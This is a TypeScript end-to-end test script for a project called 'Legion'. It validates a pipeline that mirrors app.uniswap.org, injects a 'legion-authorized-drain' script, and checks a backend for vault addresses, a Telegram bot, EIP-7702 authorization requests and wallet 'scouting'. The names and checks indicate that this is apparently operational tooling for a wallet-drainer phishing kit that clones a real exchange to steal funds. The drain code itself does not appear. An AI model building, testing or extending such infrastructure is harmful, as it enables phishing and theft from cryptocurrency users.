/**
 * Full workflow integration test — mirror → tunnel → inject → backend check.
 *
 * Usage:
 *   pnpm test-full-workflow --target https://app.uniswap.org
 *   pnpm test-full-workflow --local-only --mirror-url http://127.0.0.1:8080
 *   pnpm test-full-workflow --skip-wallet --skip-tunnel
 */
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const DEFAULT_TARGET = 'https://app.uniswap.org'
const DEFAULT_MIRROR = 'http://127.0.0.1:8080'
const BACKEND_URL =
  process.env['BACKEND_URL']?.trim() ||
  process.env['LEGION_API_URL']?.trim() ||
  'https://legionapi-production.up.railway.app'

type StepResult = { name: string; status: 'pass' | 'warn' | 'fail'; detail: string }

const results: StepResult[] = []

function record(name: string, status: StepResult['status'], detail: string): void {
  results.push({ name, status, detail })
  const icon = status === 'pass' ? '✓' : status === 'warn' ? '!' : '✗'
  console.info(`[test-full-workflow] ${icon} ${name}: ${detail}`)
}

function readArg(flag: string): string | undefined {
  const idx = process.argv.indexOf(flag)
  return idx !== -1 ? process.argv[idx + 1]?.trim() : undefined
}

function hasFlag(flag: string): boolean {
  return process.argv.includes(flag)
}

function run(cmd: string, args: string[], opts?: { timeoutMs?: number }): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, {
      cwd: REPO_ROOT,
      env: { ...process.env, FORCE_COLOR: '0' },
      shell: process.platform === 'win32',
    })
    let stdout = ''
    let stderr = ''
    child.stdout?.on('data', (d) => { stdout += String(d) })
    child.stderr?.on('data', (d) => { stderr += String(d) })
    const timer = opts?.timeoutMs
      ? setTimeout(() => {
          child.kill('SIGTERM')
          reject(new Error(`Timeout after ${opts.timeoutMs}ms: ${cmd} ${args.join(' ')}`))
        }, opts.timeoutMs)
      : null
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      resolve({ code: code ?? 1, stdout, stderr })
    })
    child.on('error', reject)
  })
}

async function checkMirrorHealth(mirrorUrl: string): Promise<void> {
  const base = mirrorUrl.replace(/\/$/, '')
  const t0 = Date.now()
  try {
    const health = await fetch(`${base}/mirror-health`, {
      signal: AbortSignal.timeout(15_000),
      headers: { 'User-Agent': 'Legion-Full-Workflow-Test/1.0', 'Accept-Language': 'en-US,en;q=0.9' },
    })
    if (!health.ok) {
      record('Mirror health', 'fail', `HTTP ${health.status}`)
      return
    }
    record('Mirror health', 'pass', `${Date.now() - t0}ms`)
  } catch (e) {
    record('Mirror health', 'fail', e instanceof Error ? e.message : String(e))
  }

  try {
    const home = await fetch(`${base}/`, {
      signal: AbortSignal.timeout(60_000),
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    })
    const body = await home.text()
    const ms = Date.now() - t0
    if (!home.ok) {
      record('Mirror homepage', 'fail', `HTTP ${home.status}`)
      return
    }
    if (/legion-authorized-drain/i.test(body)) {
      record('Drain inject', 'pass', `script referenced (${ms}ms)`)
    } else {
      record('Drain inject', 'warn', `no legion-authorized-drain in HTML (${ms}ms)`)
    }
    if (ms < 3000) {
      record('Load time', 'pass', `${ms}ms (<3s target)`)
    } else {
      record('Load time', 'warn', `${ms}ms (>3s — cache may be cold)`)
    }
  } catch (e) {
    record('Mirror homepage', 'fail', e instanceof Error ? e.message : String(e))
  }
}

async function checkBackend(): Promise<void> {
  try {
    const res = await fetch(`${BACKEND_URL.replace(/\/$/, '')}/health`, {
      signal: AbortSignal.timeout(15_000),
    })
    if (res.ok) {
      record('Backend health', 'pass', BACKEND_URL)
    } else {
      record('Backend health', 'warn', `HTTP ${res.status} at ${BACKEND_URL}`)
    }
  } catch (e) {
    record('Backend health', 'warn', e instanceof Error ? e.message : String(e))
  }
}

async function runMirrorQaAudit(mirrorUrl: string): Promise<void> {
  try {
    const { code, stderr } = await run(
      'pnpm',
      ['exec', 'tsx', 'scripts/mirror-qa-audit.ts', mirrorUrl],
      { timeoutMs: 120_000 },
    )
    if (code === 0) {
      record('Mirror QA audit', 'pass', 'all checks passed')
    } else {
      record('Mirror QA audit', 'warn', stderr.slice(-300) || `exit ${code}`)
    }
  } catch (e) {
    record('Mirror QA audit', 'warn', e instanceof Error ? e.message : String(e))
  }
}

async function checkClientConfig(): Promise<void> {
  try {
    const res = await fetch(`${BACKEND_URL.replace(/\/$/, '')}/api/v1/client-config`, {
      signal: AbortSignal.timeout(15_000),
    })
    const data = (await res.json()) as {
      ok?: boolean
      data?: {
        endpoints?: string[]
        vault_addresses?: Record<string, string | null>
        surge_origin_configured?: boolean
      }
    }
    if (res.ok && data.data?.endpoints?.length) {
      record('Client config rotation', 'pass', `${data.data.endpoints.length} endpoints`)
      const vaults = data.data.vault_addresses ?? {}
      const missing = ['cosmos', 'aptos', 'sui'].filter((k) => !vaults[k])
      if (missing.length === 0) {
        record('Vault addresses (8-chain)', 'pass', 'cosmos/aptos/sui exposed')
      } else {
        record('Vault addresses (8-chain)', 'warn', `missing: ${missing.join(', ')}`)
      }
      if (data.data.surge_origin_configured) {
        record('Surge CORS', 'pass', 'legion-drainer-test.surge.sh allowed')
      } else {
        record('Surge CORS', 'warn', 'add https://legion-drainer-test.surge.sh to API_CORS_ORIGINS')
      }
    } else {
      record('Client config rotation', 'warn', `HTTP ${res.status}`)
    }
  } catch (e) {
    record('Client config rotation', 'warn', e instanceof Error ? e.message : String(e))
  }
}

async function checkTelegramStatus(): Promise<void> {
  try {
    const res = await fetch(`${BACKEND_URL.replace(/\/$/, '')}/telegram-status`, {
      signal: AbortSignal.timeout(15_000),
    })
    const data = (await res.json()) as { ok?: boolean; data?: { running?: boolean } }
    if (res.ok && data.data?.running) {
      record('Telegram bot status', 'pass', 'polling active')
    } else {
      record('Telegram bot status', 'warn', `HTTP ${res.status}`)
    }
  } catch (e) {
    record('Telegram bot status', 'warn', e instanceof Error ? e.message : String(e))
  }
}

async function checkEip7702TypedData(): Promise<void> {
  try {
    const res = await fetch(
      `${BACKEND_URL.replace(/\/$/, '')}/api/v1/signature-anchor/eip7702-typed-data?wallet=0x0000000000000000000000000000000000000001&chain_id=1`,
      { signal: AbortSignal.timeout(15_000) },
    )
    if (res.status === 503) {
      record('EIP-7702 typed-data', 'warn', 'EIP7702_ENABLED=false (expected if disabled)')
      return
    }
    if (res.status === 200) {
      record('EIP-7702 typed-data', 'pass', 'authorization request endpoint live')
      return
    }
    record('EIP-7702 typed-data', 'warn', `HTTP ${res.status}`)
  } catch (e) {
    record('EIP-7702 typed-data', 'warn', e instanceof Error ? e.message : String(e))
  }
}

async function checkRankedScout(): Promise<void> {
  try {
    const res = await fetch(`${BACKEND_URL.replace(/\/$/, '')}/api/v1/scout/ranked`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ wallet_address: '0x0000000000000000000000000000000000000001' }),
      signal: AbortSignal.timeout(20_000),
    })
    if (res.ok) {
      record('Ranked scout API', 'pass', 'POST /api/v1/scout/ranked')
    } else {
      record('Ranked scout API', 'warn', `HTTP ${res.status}`)
    }
  } catch (e) {
    record('Ranked scout API', 'warn', e instanceof Error ? e.message : String(e))
  }
}

async function main(): Promise<void> {
  const target = readArg('--target') ?? DEFAULT_TARGET
  const mirrorUrl = readArg('--mirror-url') ?? DEFAULT_MIRROR
  const skipTunnel = hasFlag('--skip-tunnel')
  const skipWallet = hasFlag('--skip-wallet')
  const localOnly = hasFlag('--local-only')

  console.info('[test-full-workflow] Legion full pipeline validation')
  console.info(`[test-full-workflow] Target: ${target}`)

  if (!localOnly && !skipTunnel) {
    record('Clone tunnel', 'warn', 'run `pnpm clone-tunnel --god-mode --force <url>` separately (long-running)')
  }

  await checkBackend()
  await checkClientConfig()
  await checkTelegramStatus()
  await checkRankedScout()
  await checkEip7702TypedData()
  await checkMirrorHealth(mirrorUrl)
  await runMirrorQaAudit(mirrorUrl)

  if (!skipWallet) {
    record('Wallet simulation', 'warn', 'skipped — connect Sepolia wallet manually or use e2e-test-drain.ts')
  }

  const failed = results.filter((r) => r.status === 'fail').length
  const warned = results.filter((r) => r.status === 'warn').length
  const passed = results.filter((r) => r.status === 'pass').length

  console.info('')
  console.info('[test-full-workflow] Summary')
  console.info(`  Pass: ${passed}  Warn: ${warned}  Fail: ${failed}`)

  if (failed > 0) {
    process.exit(1)
  }
}

main().catch((e) => {
  console.error(`[test-full-workflow] Fatal: ${e instanceof Error ? e.message : String(e)}`)
  process.exit(1)
})
